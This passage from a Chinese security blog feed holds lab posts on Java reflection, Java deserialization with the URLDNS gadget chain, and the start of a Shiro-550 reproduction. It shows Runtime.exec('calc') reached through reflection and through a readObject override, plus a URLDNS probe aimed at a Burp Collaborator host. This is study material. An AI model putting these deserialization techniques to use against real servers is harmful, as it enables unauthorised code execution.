field);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fields = c1.getDeclaredFields(); <span class="comment">//找到全部的成员变量</span></span><br><span class="line">    <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我能找到所有成员变量，包括私有的:&quot;</span> + field);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取指定成员变量的值</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    System.out.println(name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-获取成员方法-Method"><a href="#2-获取成员方法-Method" class="headerlink" title="2. 获取成员方法 Method"></a>2. 获取成员方法 Method</h4><p>在Person.java  中添加以下方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person.java    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Study</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;学习喵~&quot;</span> + str);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">sleep</span><span class="params">(String str)</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;睡觉喵~&quot;</span> + str;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method <span class="title function_">getMethod</span><span class="params">(String name, 类&lt;?&gt;... parameterTypes)</span> <span class="comment">//返回该类所声明的public方法</span></span><br><span class="line"></span><br><span class="line">Method <span class="title function_">getDeclaredMethod</span><span class="params">(String name, 类&lt;?&gt;... parameterTypes)</span> <span class="comment">//返回该类所声明的所有方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型</span></span><br><span class="line"></span><br><span class="line">Method[] getMethods() <span class="comment">//获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</span></span><br><span class="line"></span><br><span class="line">Method[] getDeclaredMethods() <span class="comment">// 获取该类中的所有方法</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/11/27/Java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0/image-20241127140633391.png" alt="image-20241127140633391"></p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Person.class;</span><br><span class="line"><span class="comment">//        System.out.println(c1.getName());</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取类的所有方法</span></span><br><span class="line">        Method[] methods = c1.getDeclaredMethods();</span><br><span class="line">        <span class="comment">// 获取类的所有公共方法，包括类自身声明的 public 方法，父类中的  、实现的接口方法</span></span><br><span class="line">        Method[] methods1 = c1.getMethods();</span><br><span class="line">        <span class="comment">// 获取public的study方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">study</span> <span class="operator">=</span> c1.getMethod(<span class="string">&quot;Study&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">// 获取private的sleep方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">sleep</span> <span class="operator">=</span> c1.getDeclaredMethod(<span class="string">&quot;sleep&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;getDeclaredMethods: &quot;</span> + method);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Method method : methods1) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;getMethods: &quot;</span> + method);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;getMethod: &quot;</span> + study);</span><br><span class="line">        System.out.println(<span class="string">&quot;getDeclaredMethod: &quot;</span> + sleep);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="4、获取构造函数"><a href="#4、获取构造函数" class="headerlink" title="4、获取构造函数"></a>4、获取构造函数</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt;[] getConstructors() ：只返回<span class="keyword">public</span>构造函数</span><br><span class="line"></span><br><span class="line">Constructor&lt;?&gt;[] getDeclaredConstructors() ：返回所有构造函数</span><br><span class="line"></span><br><span class="line">Constructor&lt;&gt; getConstructor(类&lt;?&gt;... parameterTypes) : 匹配和参数配型相符的<span class="keyword">public</span>构造函数</span><br><span class="line"></span><br><span class="line">Constructor&lt;&gt; getDeclaredConstructor(类&lt;?&gt;... parameterTypes) ： 匹配和参数配型相符的构造函数</span><br></pre></td></tr></table></figure>

<p>与上面大同小异</p>
<h3 id="反射总结"><a href="#反射总结" class="headerlink" title="反射总结"></a>反射总结</h3><p>反射确实就那么点东西，先获取类，并进行实例化对象；</p>
<p>然后获取类里面的属性；调用类里面的方法，就没了。</p>
<h2 id="利用反射弹计算器"><a href="#利用反射弹计算器" class="headerlink" title="利用反射弹计算器"></a>利用反射弹计算器</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p><img src="/2024/11/27/Java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0/image-20241127141556697.png" alt="image-20241127141556697"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">// 反射弹计算器</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">    <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c1.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">    c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(runtime, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="方法二：-简化"><a href="#方法二：-简化" class="headerlink" title="方法二：(简化)"></a>方法二：(简化)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);  </span><br><span class="line">c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(c1.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(c1), <span class="string">&quot;C:\\WINDOWS\\System32\\calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化入门及URLDNS链</title>
    <url>/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/</url>
    <content><![CDATA[<h1 id="反序列化漏洞学习"><a href="#反序列化漏洞学习" class="headerlink" title="反序列化漏洞学习"></a>反序列化漏洞学习</h1><p>假设有这么个实体类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person.java</span><br><span class="line"> <span class="comment">//注意要实现一个Serializable接口</span></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在我们要传递这个对象，假设有两台机器，那么<strong>电脑一</strong>上进行序列化过程</p>
<h2 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SerializationTest.java</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">30</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用一个文件输出流把对象给序列化了，<strong>电脑二</strong>要读取这个类，那么就要进行反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">UnSerializeTest.java</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnSerializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span><span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行后：</p>
<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125112310262.png" alt="image-20241125112310262"></p>
<p>现在就成功拿到了这个类，</p>
<p>现在要知道，不安全的反序列化有三种情况</p>
<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125113013995.png" alt="image-20241125113013995"></p>
<p>比如</p>
<h3 id="一："><a href="#一：" class="headerlink" title="一："></a>一：</h3><p>现在我们在Person类里如果重写一个readObject，加入一个危险的命令执行，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IOException &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在把他序列化后反序列化</p>
<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125112828285.png" alt="image-20241125112828285"></p>
<p>会发现执行了命令，但这么危险的类一般不会有人这么写</p>
<h3 id="二："><a href="#二：" class="headerlink" title="二："></a>二：</h3><p>入口类参数中包含可控类，该类有危险方法，readObject时调用</p>
<p>实际上这种情况也不是很多</p>
<h3 id="三："><a href="#三：" class="headerlink" title="三："></a>三：</h3><p>入口类参数包含可控类，该类又调用其他有危险方法的类，readOBject时调用</p>
<h2 id="反射在反序列化漏洞中的作用"><a href="#反射在反序列化漏洞中的作用" class="headerlink" title="反射在反序列化漏洞中的作用"></a>反射在反序列化漏洞中的作用</h2><ul>
<li>定制需要的对象</li>
<li>通过invoke调用除了同名函数以外的函数</li>
<li>通过Class类创建对象，引入不能序列化的类</li>
</ul>
<h2 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h2><p>在上文中已经知道了一个对象只要实现了Serilizable接口，这个对象就可以被序列化</p>
<p> <code>URLDNS</code> 是知名反序列化工具ysoserial中利用链的一个名字，通常用于检测是否存在Java反序列化漏洞。该利用链具有如下特点：</p>
<ul>
<li>不限制jdk版本，使用Java内置类，对第三方依赖没有要求</li>
<li>目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞</li>
<li>URLDNS利用链，只能发起DNS请求，并不能进行其他利用</li>
</ul>
<p>跟进URL类，发现他继承了Serilizable接口，可以进行反序列化，但接着跟下去发现是无法完成序列化的</p>
<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125135542195.png" alt="image-20241125135542195"></p>
<p>这里调用了一个handler的hashCode函数,跟进</p>
<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125141701454.png" alt="image-20241125141701454"></p>
<p>有一个getHostAddress，根据介绍知道他是一个根据域名获取地址，也就是说如果调用url类的hashCode函数就可以得到一个DNS请求，就可以验证是否存在漏洞</p>
<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125141958472.png" alt="image-20241125141958472"></p>
<p>正常来说我们只要把这个hashmap给序列化了，然后在反序列化时就会发送dns请求</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://umkizmypfx2mj6b4ek775od9w02qqf.burpcollaborator.net&quot;</span>),<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但奇怪的是在序列化的时候我们就接收到了请求，而反序列化的时候却没有接收到请求</p>
<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125143456553.png" alt="image-20241125143456553"></p>
<p>阅读代码可知：</p>
<p>如果hashCode不等于-1的话他就直接返回了，而不会继续往下走</p>
<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125144017786.png" alt="image-20241125144017786"></p>
<p>hashCode在初始化的时候是-1，但我们在调用put它之后就把值给改变了，</p>
<p>我们现在不想让他发起请求，我们就要让把URL对象的hashcode改成不是-1，那么就可以通过反射去修改URL的hashcode</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射修改URL的hashCode</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCodeField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCodeField.set(url, <span class="number">114514</span>); <span class="comment">// 设置URL的hashCode为114514，只要不是-1都行</span></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在他在序列化的时候就不会发起dns请求了，验证：</p>
<p><img src="/2024/11/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%8F%8AURLDNS%E9%93%BE/image-20241125145247862.png" alt="image-20241125145247862"></p>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p><code>java.util.HashMap</code> 重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.而 <code>java.net.URL</code> 的 hashCode 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求.</p>
<h1 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h1>]]></content>
      <tags>
        <tag>Java安全</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro550漏洞分析复现</title>
    <url>/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前几天学习了Shiro的开发知识，今天复现一下Shiro550漏洞。</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p> tomcat 8.5.81（下载地址：<a class="link" href="https://archive.apache.org/dist/tomcat/tomcat-8/">Apache Tomcat® - Welcome!<i class="fas fa-external-link-alt"></i></a>）</p>
<p>JDK 1.8 （8u65）</p>
<p><a class="link" href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">Shiro环境<i class="fas fa-external-link-alt"></i></a></p>
<p>JDK先前下载过了，这里配置Tomcat8</p>
<h2 id="Tomcat-Clone-IDEA"><a href="#Tomcat-Clone-IDEA" class="headerlink" title="Tomcat&amp;&amp;Clone&amp;&amp;IDEA"></a>Tomcat&amp;&amp;Clone&amp;&amp;IDEA</h2><p>Tomcat下载的这个</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212185752111.png" alt="image-20241212185752111"></p>
<p>解压到任意目录备用</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212184741416.png" alt="image-20241212184741416"></p>
<p>先把p牛的项目Clone下来，然后按住Shift+右键shirodemo文件夹选择使用idea打开项目，点击文件–&gt;项目结构配置jdk版本，这里使用的8u65</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212184929464.png" alt="image-20241212184929464"></p>
<p>随后点击IDEA右上角，编辑运行配置，添加我们的Tomcat服务器</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212190045631.png" alt="image-20241212190045631"></p>
<p>添加成功后点击部署按钮，添加工件</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212190209267.png" alt="image-20241212190209267"></p>
<p>部署好之后点击运行</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212190246824.png" alt="image-20241212190246824"></p>
<p>这样环境就搭建好啦！登录的 username 和 password 默认是 root:secret</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>先用Burp Suite抓个包康康，然后发现Burp Suite抓不到localhost的包，</p>
<p><strong>解决方法</strong>：把<strong>localhost</strong>替换为ip地址来访问，比如我这里就是<a class="link" href="http://10.189.101.3:8080/shirodemo/login.jsp">http://10.189.101.3:8080/shirodemo/login.jsp<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212194014794.png" alt="image-20241212194014794"></p>
<p>可以看到这样就成功抓到了包</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212195116853.png" alt="image-20241212195116853"></p>
<p>登录的时候数据包会返回来一个Cookie的值</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212195843713.png" alt="image-20241212195843713"></p>
<p>然后以后每访问什么的时候就会自动带上这个cookie，这个cookie很长，一看就是储存了什么信息，猜测可能使用的序列化与反序列化来储存信息，这样方便持久化进行保存。</p>
<h2 id="跟进源码"><a href="#跟进源码" class="headerlink" title="跟进源码"></a>跟进源码</h2><p>IDEA中全局搜索cookie关键字，找到了位于shiro包下的这个Cookie</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212200354015.png" alt="image-20241212200354015"></p>
<p>，当我点进去时候是Class文件，这时候阅读极为困难，试图把源码下载下来、</p>
<p>。。。又出现了这个问题，可能是我本地Maven环境有问题</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212200456891.png" alt="image-20241212200456891"></p>
<h3 id="踩坑解决："><a href="#踩坑解决：" class="headerlink" title="踩坑解决："></a>踩坑解决：</h3><p>手动下载Shiro源码：<a class="link" href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212201122199.png" alt="image-20241212201122199"></p>
<p>选择源选择源代码，现在看到的就是正常的Java文件了捏</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>可以看到这个类里面有两个方法，一看就是对rememberMe进行序列化和反序列化的操作的</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241212201321344.png" alt="image-20241212201321344"></p>
<p>这边我们重点看<strong>getRememberedSerializedIdentity</strong>这个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">            log.debug(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">WebSubjectContext</span> <span class="variable">wsc</span> <span class="operator">=</span> (WebSubjectContext) subjectContext;</span><br><span class="line">    <span class="keyword">if</span> (isIdentityRemoved(wsc)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(wsc);</span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(wsc);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> getCookie().readValue(request, response);</span><br><span class="line">    <span class="comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span></span><br><span class="line">    <span class="comment">// ignore cookies that are scheduled for removal</span></span><br><span class="line">    <span class="keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (base64 != <span class="literal">null</span>) &#123;</span><br><span class="line">        base64 = ensurePadding(base64);</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="literal">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> decoded; <span class="comment">//关注这里</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//no cookie set - new site visitor?</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进到这个方法后，找一下哪里调用了这个方法</p>
<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213135841007.png" alt="image-20241213135841007"></p>
<p>然后就跟进到了这里，可以看到convertBytesToPrincipals用来转换getRememberedSerializedIdentity，点进去后看这个convertBytesToPrincipals</p>
